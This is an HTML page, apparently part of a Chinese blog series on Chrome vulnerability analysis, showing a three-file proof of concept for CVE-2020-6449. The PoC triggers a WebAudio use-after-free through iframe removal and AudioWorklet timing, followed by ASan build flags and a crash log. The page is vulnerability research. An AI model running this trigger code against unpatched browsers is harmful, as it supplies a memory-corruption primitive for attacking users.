@@ -1,0 +1,367 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chrome漏洞分析与利用(十一)——issue 1059686(cve 2020-6449)</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <a href="../index.html"
+    style="position: fixed; top: 0; left: 2pt; text-align: center;text-decoration-line: none;color: black;font-size: 15px;">
+    <img src="../img/home.png" width="15" height="15" alt="home">
+    <span>HOME PAGE</span>
+  </a>
+  <div class="stackedit__html">
+    <h1><a id="POC_0"></a>POC</h1>
+    <p>该漏洞POC有三个文件：</p>
+    <pre><code class="prism language-html"><span class="token comment">&lt;!--finished1.html--&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+<span class="token keyword">function</span> <span class="token function">createIframe</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">;</span>
+  iframe<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'ifrm'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'finished2.html'</span><span class="token punctuation">;</span>
+  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> frame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"ifrm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  frame<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">removeFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token function">setTimeout</span><span class="token punctuation">(</span>remove<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">createIframe</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+    <pre><code class="prism language-html"><span class="token comment">&lt;!--finished2.html--&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">startStop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">let</span> audioCtx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OfflineAudioContext</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3072</span><span class="token punctuation">,</span><span class="token number">3072</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">await</span> audioCtx<span class="token punctuation">.</span>audioWorklet<span class="token punctuation">.</span><span class="token function">addModule</span><span class="token punctuation">(</span><span class="token string">'test-processor.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">let</span> testNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AudioWorkletNode</span><span class="token punctuation">(</span>audioCtx<span class="token punctuation">,</span> <span class="token string">'test-processor'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string-property property">'numberOfOutputs'</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">let</span> splitter <span class="token operator">=</span> audioCtx<span class="token punctuation">.</span><span class="token function">createChannelSplitter</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">let</span> src <span class="token operator">=</span> audioCtx<span class="token punctuation">.</span><span class="token function">createConstantSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  src<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  src<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">let</span> src2 <span class="token operator">=</span> audioCtx<span class="token punctuation">.</span><span class="token function">createConstantSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  src2<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>splitter<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  splitter<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>audioCtx<span class="token punctuation">.</span>destination<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  splitter<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>testNode<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> audioCtx<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">function</span> <span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token function">startStop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">audioCtx</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
+    audioCtx<span class="token punctuation">.</span><span class="token function">suspend</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">*</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">3072.0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
+      <span class="token keyword">let</span> dest <span class="token operator">=</span> audioCtx<span class="token punctuation">.</span><span class="token function">createConstantSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      dest<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">2000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        dest <span class="token operator">=</span> dest<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>audioCtx<span class="token punctuation">.</span><span class="token function">createPanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      dest<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span>audioCtx<span class="token punctuation">.</span>destination<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">gc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
+        audioCtx<span class="token punctuation">.</span><span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        parent<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    audioCtx<span class="token punctuation">.</span><span class="token function">startRendering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">onLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">/&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+</code></pre>
+    <pre><code class="prism language-js"><span class="token comment">//test-processor.js</span>
+<span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">miliseconds</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   <span class="token keyword">var</span> currentTime <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">while</span> <span class="token punctuation">(</span>currentTime <span class="token operator">+</span> miliseconds <span class="token operator">&gt;=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+   <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">TestProcessor</span> <span class="token keyword">extends</span> <span class="token class-name">AudioWorkletProcessor</span> <span class="token punctuation">{</span>
+  <span class="token function">process</span> <span class="token punctuation">(</span><span class="token parameter">inputs<span class="token punctuation">,</span> outputs<span class="token punctuation">,</span> parameters</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token boolean">true</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">registerProcessor</span><span class="token punctuation">(</span><span class="token string">'test-processor'</span><span class="token punctuation">,</span> TestProcessor<span class="token punctuation">)</span>
+</code></pre>
+    <p>编译参数：</p>
+    <pre><code>is_debug = false
+is_asan = true
+dcheck_always_on = false
+enable_nacl = false
+symbol_level = 2
+blink_symbol_level = 2
+target_cpu = "x64"
+target_os = "win"
+ffmpeg_branding = "Chrome"
+</code></pre>
+    <h1><a id="_102"></a>漏洞分析</h1>
+    <p>运行POC后查看asan日志：</p>
+    <pre><code>=================================================================
+==9296==ERROR: AddressSanitizer: heap-use-after-free on address 0x124cdeb931e8 at pc 0x7ffc717bfb1b bp 0x004e2c1ff240 sp 0x004e2c1ff248
+READ of size 4 at 0x124cdeb931e8 thread T15
+==9296==*** WARNING: Failed to initialize DbgHelp!              ***
+==9296==*** Most likely this means that the app is already      ***
+==9296==*** using DbgHelp, possibly with incompatible flags.    ***
+==9296==*** Due to technical reasons, symbolization might crash ***
+==9296==*** or produce wrong results.                           ***
+    #0 0x7ffc717bfb1a in blink::AudioHandler::BreakConnectionWithLock E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\audio_node.cc:508
+[4804:11188:0719/190058.026:ERROR:gcm_channel_status_request.cc(145)] GCM channel request failed.
+    #1 0x7ffc72230ab6 in blink::DeferredTaskHandler::BreakConnections E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\deferred_task_handler.cc:82
+    #2 0x7ffc710fff8b in blink::OfflineAudioContext::HandlePostRenderTasks E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\offline_audio_context.cc:430
+    #3 0x7ffc72286463 in blink::OfflineAudioDestinationHandler::RenderIfNotSuspended E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\offline_audio_destination_node.cc:324
+    #4 0x7ffc72285269 in blink::OfflineAudioDestinationHandler::DoOfflineRendering E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\offline_audio_destination_node.cc:190
+    #5 0x7ffc63ff1603 in base::TaskAnnotator::RunTask E:\chromium\80.0.3987.132\src\base\task\common\task_annotator.cc:142
+    #6 0x7ffc663fe30b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:365
+    #7 0x7ffc663fdaba in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:219
+    #8 0x7ffc663d16a3 in base::MessagePumpDefault::Run E:\chromium\80.0.3987.132\src\base\message_loop\message_pump_default.cc:39
+    #9 0x7ffc66400239 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:463
+    #10 0x7ffc63fa5cbe in base::RunLoop::Run E:\chromium\80.0.3987.132\src\base\run_loop.cc:156
+    #11 0x7ffc631e0dab in blink::scheduler::WorkerThread::SimpleThreadImpl::Run E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread.cc:169
+    #12 0x7ffc640f0368 in base::`anonymous namespace'::ThreadFunc E:\chromium\80.0.3987.132\src\base\threading\platform_thread_win.cc:106
+    #13 0x7ff70ba47bd9 in __asan::AsanThread::ThreadStart D:\a\_work\1\s\src\vctools\crt\asan\llvm\compiler-rt\lib\asan\asan_thread.cpp:262
+    #14 0x7ffcc8717033 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017033)
+    #15 0x7ffcc8d22650 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x180052650)
+
+0x124cdeb931e8 is located 104 bytes inside of 248-byte region [0x124cdeb93180,0x124cdeb93278)
+freed by thread T0 here:
+    #0 0x7ff70ba523b2 in free D:\a\_work\1\s\src\vctools\crt\asan\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:120
+    #1 0x7ffc710b8589 in blink::ConstantSourceHandler::~ConstantSourceHandler E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\constant_source_node.cc:37
+    #2 0x7ffc717bbcc9 in WTF::HashTable&lt;scoped_refptr&lt;blink::AudioHandler&gt;,scoped_refptr&lt;blink::AudioHandler&gt;,WTF::IdentityExtractor,WTF::RefPtrHash&lt;blink::AudioHandler&gt;,WTF::HashTraits&lt;scoped_refptr&lt;blink::AudioHandler&gt; &gt;,WTF::HashTraits&lt;scoped_refptr&lt;blink::AudioHandler&gt; &gt;,WTF::PartitionAllocator&gt;::DeleteAllBucketsAndDeallocate E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\wtf\hash_table.h:1682
+    #3 0x7ffc72234b8a in blink::DeferredTaskHandler::ClearHandlersToBeDeleted E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\deferred_task_handler.cc:359
+    #4 0x7ffc717b4d4e in blink::BaseAudioContext::Uninitialize E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\base_audio_context.cc:178
+    #5 0x7ffc67cf4d78 in blink::LifecycleNotifier&lt;blink::ExecutionContext,blink::ContextLifecycleObserver&gt;::NotifyContextDestroyed E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\lifecycle_notifier.h:161
+    #6 0x7ffc67db921e in blink::Document::Shutdown E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\dom\document.cc:3473
+    #7 0x7ffc67f80a73 in blink::LocalFrame::DetachImpl E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\frame\local_frame.cc:322
+    #8 0x7ffc67f9d629 in blink::Frame::Detach E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\frame\frame.cc:81
+    #9 0x7ffc6ad9ff7b in blink::ChildFrameDisconnector::DisconnectCollectedFrameOwners E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\dom\child_frame_disconnector.cc:59
+    #10 0x7ffc68022d93 in blink::ContainerNode::WillRemoveChild E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\dom\container_node.cc:623
+    #11 0x7ffc680220b4 in blink::ContainerNode::RemoveChild E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\dom\container_node.cc:695
+    #12 0x7ffc6ad728e9 in blink::V8Node::RemoveChildMethodCallback E:\chromium\80.0.3987.132\src\out\asan\gen\third_party\blink\renderer\bindings\core\v8\v8_node.cc:1043
+    #13 0x7ffc608eab3a in v8::internal::FunctionCallbackArguments::Call E:\chromium\80.0.3987.132\src\v8\src\api\api-arguments-inl.h:158
+    #14 0x7ffc608e7bb1 in v8::internal::`anonymous namespace'::HandleApiCallHelper&lt;0&gt; E:\chromium\80.0.3987.132\src\v8\src\builtins\builtins-api.cc:111
+    #15 0x7ffc608e5288 in v8::internal::Builtin_Impl_HandleApiCall E:\chromium\80.0.3987.132\src\v8\src\builtins\builtins-api.cc:141
+    #16 0x7ffc608e452e in v8::internal::Builtin_HandleApiCall E:\chromium\80.0.3987.132\src\v8\src\builtins\builtins-api.cc:129
+    #17 0x7ffc62c5fbbb in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x3b (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186fbfbbb)
+    #18 0x7ffc62be8a6a in Builtins_InterpreterEntryTrampoline+0xca (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f48a6a)
+    #19 0x7ffc62be8a6a in Builtins_InterpreterEntryTrampoline+0xca (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f48a6a)
+    #20 0x7ffc62be617d in Builtins_JSEntryTrampoline+0x5d (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f4617d)
+    #21 0x7ffc62be5d6b in Builtins_JSEntry+0xcb (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f45d6b)
+    #22 0x7ffc60c022a1 in v8::internal::`anonymous namespace'::Invoke E:\chromium\80.0.3987.132\src\v8\src\execution\execution.cc:266
+    #23 0x7ffc60c01400 in v8::internal::Execution::Call E:\chromium\80.0.3987.132\src\v8\src\execution\execution.cc:360
+    #24 0x7ffc607bbb3b in v8::Function::Call E:\chromium\80.0.3987.132\src\v8\src\api\api.cc:4918
+    #25 0x7ffc68136af3 in blink::V8ScriptRunner::CallFunction E:\chromium\80.0.3987.132\src\third_party\blink\renderer\bindings\core\v8\v8_script_runner.cc:472
+    #26 0x7ffc6db1dda3 in blink::V8Function::Invoke E:\chromium\80.0.3987.132\src\out\asan\gen\third_party\blink\renderer\bindings\core\v8\v8_function.cc:107
+    #27 0x7ffc6db1e841 in blink::V8Function::InvokeAndReportException E:\chromium\80.0.3987.132\src\out\asan\gen\third_party\blink\renderer\bindings\core\v8\v8_function.cc:251
+    #28 0x7ffc6fac9b64 in blink::ScheduledAction::Execute E:\chromium\80.0.3987.132\src\third_party\blink\renderer\bindings\core\v8\scheduled_action.cc:155
+
+previously allocated by thread T0 here:
+    #0 0x7ff70ba524f2 in malloc D:\a\_work\1\s\src\vctools\crt\asan\llvm\compiler-rt\lib\asan\asan_malloc_win.cpp:129
+    #1 0x7ffc6523dac5 in WTF::Partitions::FastMalloc E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\wtf\allocator\partitions.cc:232
+    #2 0x7ffc710b8094 in blink::ConstantSourceNode::ConstantSourceNode E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\constant_source_node.cc:128
+    #3 0x7ffc710b81ee in blink::MakeGarbageCollected&lt;blink::ConstantSourceNode,blink::BaseAudioContext &amp;&gt; E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\heap\heap.h:535
+    #4 0x7ffc7105778d in blink::V8BaseAudioContext::CreateConstantSourceMethodCallback E:\chromium\80.0.3987.132\src\out\asan\gen\third_party\blink\renderer\bindings\modules\v8\v8_base_audio_context.cc:739
+    #5 0x7ffc608eab3a in v8::internal::FunctionCallbackArguments::Call E:\chromium\80.0.3987.132\src\v8\src\api\api-arguments-inl.h:158
+    #6 0x7ffc608e7bb1 in v8::internal::`anonymous namespace'::HandleApiCallHelper&lt;0&gt; E:\chromium\80.0.3987.132\src\v8\src\builtins\builtins-api.cc:111
+    #7 0x7ffc608e5288 in v8::internal::Builtin_Impl_HandleApiCall E:\chromium\80.0.3987.132\src\v8\src\builtins\builtins-api.cc:141
+    #8 0x7ffc608e452e in v8::internal::Builtin_HandleApiCall E:\chromium\80.0.3987.132\src\v8\src\builtins\builtins-api.cc:129
+    #9 0x7ffc62c5fbbb in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x3b (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186fbfbbb)
+    #10 0x7ffc62be8a6a in Builtins_InterpreterEntryTrampoline+0xca (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f48a6a)
+    #11 0x7ffc62c19a10 in Builtins_AsyncFunctionAwaitResolveClosure+0x30 (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f79a10)
+    #12 0x7ffc62c3d933 in Builtins_PromiseFulfillReactionJob+0x33 (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f9d933)
+    #13 0x7ffc62c0acfc in Builtins_RunMicrotasks+0x23c (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f6acfc)
+    #14 0x7ffc62be606b in Builtins_JSRunMicrotasksEntry+0xcb (E:\chromium\80.0.3987.132\src\out\asan\chrome.dll+0x186f4606b)
+    #15 0x7ffc60c01f5b in v8::internal::`anonymous namespace'::Invoke E:\chromium\80.0.3987.132\src\v8\src\execution\execution.cc:281
+    #16 0x7ffc60c0461f in v8::internal::`anonymous namespace'::InvokeWithTryCatch E:\chromium\80.0.3987.132\src\v8\src\execution\execution.cc:326
+    #17 0x7ffc60c04b0f in v8::internal::Execution::TryRunMicrotasks E:\chromium\80.0.3987.132\src\v8\src\execution\execution.cc:405
+    #18 0x7ffc60c81c51 in v8::internal::MicrotaskQueue::RunMicrotasks E:\chromium\80.0.3987.132\src\v8\src\execution\microtask-queue.cc:164
+    #19 0x7ffc631bc584 in blink::scheduler::MainThreadSchedulerImpl::OnTaskCompleted E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\scheduler\main_thread\main_thread_scheduler_impl.cc:2446
+    #20 0x7ffc631c6e37 in blink::scheduler::MainThreadTaskQueue::OnTaskCompleted E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\scheduler\main_thread\main_thread_task_queue.cc:194
+    #21 0x7ffc64001ac2 in base::sequence_manager::internal::SequenceManagerImpl::NotifyDidProcessTask E:\chromium\80.0.3987.132\src\base\task\sequence_manager\sequence_manager_impl.cc:844
+    #22 0x7ffc6400145c in base::sequence_manager::internal::SequenceManagerImpl::DidRunTask E:\chromium\80.0.3987.132\src\base\task\sequence_manager\sequence_manager_impl.cc:678
+    #23 0x7ffc663fe442 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:378
+    #24 0x7ffc663fdaba in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:219
+    #25 0x7ffc663d16a3 in base::MessagePumpDefault::Run E:\chromium\80.0.3987.132\src\base\message_loop\message_pump_default.cc:39
+    #26 0x7ffc66400239 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run E:\chromium\80.0.3987.132\src\base\task\sequence_manager\thread_controller_with_message_pump_impl.cc:463
+    #27 0x7ffc63fa5cbe in base::RunLoop::Run E:\chromium\80.0.3987.132\src\base\run_loop.cc:156
+    #28 0x7ffc65eefc12 in content::RendererMain E:\chromium\80.0.3987.132\src\content\renderer\renderer_main.cc:213
+
+Thread T15 created by T0 here:
+    #0 0x7ff70ba47328 in __asan_wrap_CreateThread D:\a\_work\1\s\src\vctools\crt\asan\llvm\compiler-rt\lib\asan\asan_win.cpp:145
+    #1 0x7ffc640ef557 in base::`anonymous namespace'::CreateThreadInternal E:\chromium\80.0.3987.132\src\base\threading\platform_thread_win.cc:153
+    #2 0x7ffc6402e7f4 in base::SimpleThread::StartAsync E:\chromium\80.0.3987.132\src\base\threading\simple_thread.cc:51
+    #3 0x7ffc631df51d in blink::scheduler::WorkerThread::Init E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\scheduler\worker\worker_thread.cc:61
+    #4 0x7ffc631639ac in blink::Thread::CreateThread E:\chromium\80.0.3987.132\src\third_party\blink\renderer\platform\scheduler\common\thread.cc:82
+    #5 0x7ffc6b9e0a61 in blink::WorkerBackingThread::WorkerBackingThread E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\workers\worker_backing_thread.cc:59
+    #6 0x7ffc73026a5b in blink::WorkletThreadHolder&lt;blink::AudioWorkletThread&gt;::EnsureInstance E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\workers\worklet_thread_holder.h:34
+    #7 0x7ffc7302807f in blink::AudioWorkletThread::EnsureSharedBackingThread E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\audio_worklet_thread.cc:67
+    #8 0x7ffc73027f67 in blink::AudioWorkletThread::AudioWorkletThread E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\audio_worklet_thread.cc:40
+    #9 0x7ffc73027db4 in blink::AudioWorkletThread::Create E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\audio_worklet_thread.cc:32
+    #10 0x7ffc72798b51 in blink::AudioWorkletMessagingProxy::CreateWorkerThread E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\audio_worklet_messaging_proxy.cc:95
+    #11 0x7ffc703d7c02 in blink::ThreadedMessagingProxyBase::InitializeWorkerThread E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\workers\threaded_messaging_proxy_base.cc:71
+    #12 0x7ffc727659d0 in blink::ThreadedWorkletMessagingProxy::Initialize E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\workers\threaded_worklet_messaging_proxy.cc:79
+    #13 0x7ffc72259c77 in blink::AudioWorklet::CreateGlobalScope E:\chromium\80.0.3987.132\src\third_party\blink\renderer\modules\webaudio\audio_worklet.cc:81
+    #14 0x7ffc6fb2e30a in blink::Worklet::FetchAndInvokeScript E:\chromium\80.0.3987.132\src\third_party\blink\renderer\core\workers\worklet.cc:164
+    #15 0x7ffc63ff1603 in base::TaskAnnotator::RunTask E:\chromium\80.0.3987.132\src\base\task\common\task_annotator.cc:142
